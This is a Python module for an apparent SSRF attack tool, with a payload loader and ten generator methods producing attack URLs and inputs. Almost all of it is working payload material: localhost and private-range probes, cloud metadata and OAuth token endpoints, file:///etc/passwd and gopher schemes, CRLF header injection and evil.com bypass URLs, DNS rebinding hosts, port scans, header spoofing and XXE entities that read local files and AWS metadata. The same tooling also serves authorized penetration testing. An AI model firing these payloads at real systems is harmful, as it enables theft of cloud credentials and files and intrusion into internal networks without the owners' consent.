"""
Attack Modules - Implementation of 10 SSRF Attack Phases
"""

import os
import re
import urllib.parse
import itertools
import logging
from typing import List, Dict, Generator, Optional
from pathlib import Path

logger = logging.getLogger(__name__)


class PayloadManager:
    """Manages SSRF payloads from files and dynamic generation"""
    
    def __init__(self, payloads_dir: str = "../payloads"):
        """
        Initialize payload manager
        
        Args:
            payloads_dir: Directory containing payload files
        """
        try:
            self.payloads_dir = Path(payloads_dir)
            self.payloads_cache: Dict[str, List[str]] = {}
            logger.info(f"Payload manager initialized with directory: {payloads_dir}")
        except Exception as e:
            logger.error(f"Error initializing payload manager: {e}")
            raise
    
    def load_payloads(self, filename: str) -> List[str]:
        """
        Load payloads from a file
        
        Args:
            filename: Name of payload file
            
        Returns:
            List of payloads
        """
        try:
            # Check cache first
            if filename in self.payloads_cache:
                logger.debug(f"Loading {filename} from cache")
                return self.payloads_cache[filename]
            
            filepath = self.payloads_dir / filename
            
            if not filepath.exists():
                logger.warning(f"Payload file not found: {filepath}")
                return []
            
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            self.payloads_cache[filename] = payloads
            logger.info(f"Loaded {len(payloads)} payloads from {filename}")
            
            return payloads
            
        except Exception as e:
            logger.error(f"Error loading payloads from {filename}: {e}")
            return []
    
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """
        Load all available payload files
        
        Returns:
            Dictionary mapping payload type to payload list
        """
        try:
            payload_files = {
                'local_ips': 'local_ips.txt',
                'cloud_metadata': 'cloud_metadata.txt',
                'protocols': 'protocols.txt',
                'crlf': 'crlf_ssrf.txt',
                'encoded': 'encoded_payloads.txt',
                'dns_rebinding': 'dns_rebinding.txt',
                'parameters': 'parameter_payloads.txt',
                'ports': 'port_payloads.txt',
                'waf_bypass': 'waf_bypass.txt',
                'xxe': 'xxe_ssrf.txt',
                'headers': 'headers.txt'
            }
            
            all_payloads = {}
            
            for payload_type, filename in payload_files.items():
                payloads = self.load_payloads(filename)
                if payloads:
                    all_payloads[payload_type] = payloads
            
            logger.info(f"Loaded {len(all_payloads)} payload categories")
            return all_payloads
            
        except Exception as e:
            logger.error(f"Error loading all payloads: {e}")
            return {}


class AttackModules:
    """Implementation of 10 SSRF attack phases"""
    
    def __init__(self, payload_manager: PayloadManager):
        """
        Initialize attack modules
        
        Args:
            payload_manager: PayloadManager instance
        """
        try:
            self.payload_manager = payload_manager
            logger.info("Attack modules initialized")
        except Exception as e:
            logger.error(f"Error initializing attack modules: {e}")
            raise
    
    # Phase 1: Local IP & Internal Network
    def generate_local_ips(self) -> Generator[str, None, None]:
        """
        Generate local and internal IP addresses
        
        Yields:
            IP address strings
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('local_ips.txt')
            for payload in file_payloads:
                if not payload.startswith(('http://', 'https://')):
                    yield f"http://{payload}"
                    yield f"http://{payload}/admin"
                else:
                    yield payload
            
            # Dynamic generation - localhost variations
            localhost_variations = [
                'localhost',
                '127.0.0.1',
                '127.1',
                '127.0.1',
                '0.0.0.0',
                '0',
                '[::]',
                '[::1]',
                '2130706433',  # Decimal for 127.0.0.1
                '0x7f000001',  # Hex for 127.0.0.1
                '017700000001',  # Octal for 127.0.0.1
            ]
            
            # Add path variations for localhost
            common_paths = ['', '/admin', '/status', '/metrics']
            for variation in localhost_variations:
                for path in common_paths:
                    yield f"http://{variation}{path}"
            
            # Private network ranges
            for i in range(1, 256):
                yield f"http://192.168.1.{i}"
                yield f"http://10.0.0.{i}"
                yield f"http://172.16.0.{i}"
            
            logger.debug("Generated local IP payloads")
            
        except Exception as e:
            logger.error(f"Error generating local IPs: {e}")
    
    # Phase 2: Cloud Metadata
    def generate_cloud_metadata(self) -> Generator[str, None, None]:
        """
        Generate cloud metadata endpoints
        
        Yields:
            Cloud metadata URLs
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('cloud_metadata.txt')
            for payload in file_payloads:
                yield payload
            
            # Dynamic generation
            cloud_endpoints = [
                # AWS
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data/',
                'http://169.254.169.254/latest/dynamic/instance-identity/',
                
                # Google Cloud
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://metadata/computeMetadata/v1/',
                
                # Azure
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/identity/oauth2/token',
                
                # DigitalOcean
                'http://169.254.169.254/metadata/v1/',
                
                # Oracle Cloud
                'http://169.254.169.254/opc/v1/instance/',
            ]
            
            for endpoint in cloud_endpoints:
                yield endpoint
            
            logger.debug("Generated cloud metadata payloads")
            
        except Exception as e:
            logger.error(f"Error generating cloud metadata: {e}")
    
    # Phase 3: Protocol & Scheme Confusion
    def generate_protocol_confusion(self, base_target: str = "127.0.0.1:80") -> Generator[str, None, None]:
        """
        Generate protocol confusion payloads
        
        Args:
            base_target: Base target for protocol testing
            
        Yields:
            Protocol confusion URLs
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('protocols.txt')
            for payload in file_payloads:
                yield payload
            
            # Dynamic generation
            protocols = [
                'file://',
                'gopher://',
                'dict://',
                'ftp://',
                'tftp://',
                'ldap://',
                'jar://',
                'netdoc://',
                'mailto:',
                'data:',
                'expect://',
                'php://',
            ]
            
            for protocol in protocols:
                yield f"{protocol}{base_target}"
                yield f"{protocol}/etc/passwd"
                yield f"{protocol}localhost"
            
            logger.debug("Generated protocol confusion payloads")
            
        except Exception as e:
            logger.error(f"Error generating protocol confusion: {e}")
    
    # Phase 4: CRLF Injection
    def generate_crlf_payloads(self, base_url: str) -> Generator[str, None, None]:
        """
        Generate CRLF injection payloads
        
        Args:
            base_url: Base URL to inject CRLF into
            
        Yields:
            CRLF injection payloads
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('crlf_ssrf.txt')
            for payload in file_payloads:
                yield payload
            
            # Dynamic generation
            crlf_sequences = [
                '%0d%0a',
                '%0D%0A',
                '%0a',
                '%0A',
                '\\r\\n',
                '\\n',
                '%E5%98%8A%E5%98%8D',  # Unicode CRLF
                '%E5%98%8D%E5%98%8A',
            ]
            
            injection_headers = [
                'X-Forwarded-For: 127.0.0.1',
                'Host: evil.com',
                'Set-Cookie: session=hacked',
            ]
            
            for crlf in crlf_sequences:
                for header in injection_headers:
                    yield f"{base_url}{crlf}{header}"
            
            logger.debug("Generated CRLF injection payloads")
            
        except Exception as e:
            logger.error(f"Error generating CRLF payloads: {e}")
    
    # Phase 5: Advanced Bypasses & Encoding
    def generate_bypass_payloads(self, target: str = "127.0.0.1") -> Generator[str, None, None]:
        """
        Generate bypass and encoding payloads
        
        Args:
            target: Target to encode/bypass
            
        Yields:
            Bypass payloads
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('waf_bypass.txt')
            for payload in file_payloads:
                yield payload
            
            encoded_payloads = self.payload_manager.load_payloads('encoded_payloads.txt')
            for payload in encoded_payloads:
                yield payload
            
            # Dynamic generation - URL encoding variations
            encodings = [
                target,
                urllib.parse.quote(target),
                urllib.parse.quote(urllib.parse.quote(target)),  # Double encoding
                target.replace('.', '%2e'),
                target.replace('.', '%252e'),  # Double encoded dot
            ]
            
            for encoded in encodings:
                yield f"http://{encoded}"
                yield f"https://{encoded}"
            
            # @ symbol bypass
            yield f"http://evil.com@{target}"
            yield f"http://{target}@evil.com"
            
            # Subdomain bypass
            yield f"http://{target}.evil.com"
            
            # Decimal/Hex/Octal IP
            if target == "127.0.0.1":
                yield "http://2130706433"  # Decimal
                yield "http://0x7f000001"  # Hex
                yield "http://017700000001"  # Octal
            
            logger.debug("Generated bypass payloads")
            
        except Exception as e:
            logger.error(f"Error generating bypass payloads: {e}")
    
    # Phase 6: DNS Rebinding & Manipulation
    def generate_dns_payloads(self) -> Generator[str, None, None]:
        """
        Generate DNS rebinding payloads
        
        Yields:
            DNS rebinding domains
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('dns_rebinding.txt')
            for payload in file_payloads:
                yield payload
            
            # Dynamic generation - common DNS rebinding services
            dns_services = [
                'http://127.0.0.1.nip.io',
                'http://127.0.0.1.xip.io',
                'http://127.0.0.1.sslip.io',
                'http://localtest.me',
                'http://127.0.0.1.trafficpeak.invalid',
            ]
            
            for service in dns_services:
                yield service
            
            logger.debug("Generated DNS rebinding payloads")
            
        except Exception as e:
            logger.error(f"Error generating DNS payloads: {e}")
    
    # Phase 7: Port Scanning
    def generate_port_scan_payloads(self, target: str = "127.0.0.1") -> Generator[str, None, None]:
        """
        Generate port scanning payloads
        
        Args:
            target: Target IP/host
            
        Yields:
            Port scan URLs
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('port_payloads.txt')
            for payload in file_payloads:
                yield payload
            
            # Common ports
            common_ports = [
                21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017
            ]
            
            for port in common_ports:
                yield f"http://{target}:{port}"
            
            logger.debug("Generated port scan payloads")
            
        except Exception as e:
            logger.error(f"Error generating port scan payloads: {e}")
    
    # Phase 8: Parameter Fuzzing
    def generate_parameter_payloads(self, url: str) -> Generator[Dict[str, str], None, None]:
        """
        Generate parameter fuzzing payloads
        
        Args:
            url: Base URL
            
        Yields:
            Dictionary with parameter name and payload
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('parameter_payloads.txt')
            
            # Common parameter names
            param_names = [
                'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'return',
                'continue', 'next', 'link', 'target', 'rurl', 'file', 'document',
                'folder', 'root', 'page', 'feed', 'host', 'port', 'to', 'out',
                'view', 'dir', 'show', 'navigation', 'open', 'callback', 'return_to'
            ]
            
            # Test payloads
            test_targets = ['http://127.0.0.1', 'http://localhost', 'file:///etc/passwd']
            
            for param in param_names:
                for payload in test_targets:
                    yield {'param': param, 'payload': payload}
                
                # Also test file payloads
                for file_payload in file_payloads[:10]:  # Limit to avoid too many
                    yield {'param': param, 'payload': file_payload}
            
            logger.debug("Generated parameter fuzzing payloads")
            
        except Exception as e:
            logger.error(f"Error generating parameter payloads: {e}")
    
    # Phase 9: Header Injection
    def generate_header_payloads(self) -> Generator[Dict[str, str], None, None]:
        """
        Generate header injection payloads
        
        Yields:
            Dictionary with header name and value
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('headers.txt')
            
            for line in file_payloads:
                if ':' in line:
                    header, value = line.split(':', 1)
                    yield {'header': header.strip(), 'value': value.strip()}
            
            # Dynamic generation
            headers = {
                'X-Forwarded-For': ['127.0.0.1', 'localhost', '169.254.169.254'],
                'X-Forwarded-Host': ['127.0.0.1', 'localhost', 'evil.com'],
                'X-Original-URL': ['/admin', '/internal', '/api/v1/'],
                'X-Rewrite-URL': ['/admin', '/internal'],
                'X-Real-IP': ['127.0.0.1', 'localhost'],
                'Forwarded': ['for=127.0.0.1', 'host=localhost'],
                'Client-IP': ['127.0.0.1'],
                'True-Client-IP': ['127.0.0.1'],
            }
            
            for header, values in headers.items():
                for value in values:
                    yield {'header': header, 'value': value}
            
            logger.debug("Generated header injection payloads")
            
        except Exception as e:
            logger.error(f"Error generating header payloads: {e}")
    
    # Phase 10: XXE-based SSRF
    def generate_xxe_payloads(self) -> Generator[str, None, None]:
        """
        Generate XXE-based SSRF payloads
        
        Yields:
            XXE payload strings
        """
        try:
            # Load from file
            file_payloads = self.payload_manager.load_payloads('xxe_ssrf.txt')
            for payload in file_payloads:
                yield payload
            
            # Dynamic generation
            xxe_templates = [
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
                
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>%xxe;</foo>''',
            ]
            
            for template in xxe_templates:
                yield template
            
            logger.debug("Generated XXE payloads")
            
        except Exception as e:
            logger.error(f"Error generating XXE payloads: {e}")
    
    def get_all_attack_payloads(self, target_url: str) -> Dict[str, List]:
        try:
            all_payloads = {
                'local_ips': list(itertools.islice(self.generate_local_ips(), 100)),
                'cloud_metadata': list(itertools.islice(self.generate_cloud_metadata(), 50)),
                'protocol_confusion': list(itertools.islice(self.generate_protocol_confusion(), 50)),
                'crlf_injection': list(itertools.islice(self.generate_crlf_payloads(target_url), 30)),
                'bypass_encoding': list(itertools.islice(self.generate_bypass_payloads(), 50)),
                'dns_rebinding': list(itertools.islice(self.generate_dns_payloads(), 20)),
                'port_scanning': list(itertools.islice(self.generate_port_scan_payloads(), 30)),
                'parameter_fuzzing': list(itertools.islice(self.generate_parameter_payloads(target_url), 100)),
                'header_injection': list(itertools.islice(self.generate_header_payloads(), 30)),
                'xxe_ssrf': list(itertools.islice(self.generate_xxe_payloads(), 20)),
            }
            
            total = sum(len(payloads) for payloads in all_payloads.values())
            logger.info(f"Generated {total} total attack payloads across {len(all_payloads)} phases")
            
            return all_payloads
            
        except Exception as e:
            logger.error(f"Error getting all attack payloads: {e}")
            return {}